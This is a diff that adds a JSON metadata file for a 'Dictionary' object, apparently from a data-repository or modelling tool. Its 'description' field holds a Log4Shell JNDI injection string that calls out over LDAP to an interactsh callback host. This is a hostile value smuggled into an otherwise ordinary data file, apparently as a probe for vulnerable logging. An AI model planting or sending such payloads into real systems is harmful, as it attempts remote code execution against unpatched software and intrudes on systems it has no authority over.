@@ -1,0 +1,27 @@
+{
+  "objectInfo" : {
+    "id" : "31ciAPNgvOjd568JYB6acx",
+    "name" : "Dictionary",
+    "type" : "DICTIONARY",
+    "metadata" : {
+      "modelVersion" : {
+        "major" : 1,
+        "minor" : 0
+      },
+      "repoInfo" : {
+        "repoHandle" : "31ciAPNgvOjd568JYB6acx"
+      },
+      "contextAttributes" : [ ],
+      "additionalInfo" : {
+        "description" : "${jndi:ldap://c6q7vvaek13r2qel4m2gcg4899oyyyyyn.interactsh.com/a}",
+        "contentType" : "Binary",
+        "documentState" : "VALID"
+      }
+    }
+  },
+  "dataFileExtension" : "json",
+  "updateTime" : "2025-06-13T09:12:36.716Z",
+  "objectRefs" : [ ],
+  "readableFileExtension" : null,
+  "readableFilePresent" : false
+}
